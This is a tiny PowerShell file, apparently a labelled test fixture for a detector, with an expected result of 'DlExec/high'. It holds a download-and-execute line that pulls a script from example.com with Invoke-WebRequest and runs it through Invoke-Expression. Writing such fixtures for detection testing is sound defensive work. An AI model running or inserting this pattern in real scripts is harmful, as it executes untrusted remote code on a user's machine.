# expect: DlExec/high
# url: https://example.com/b.ps1
$code = (Invoke-WebRequest -Uri 'https://example.com/b.ps1' -UseBasicParsing).Content
Invoke-Expression $code
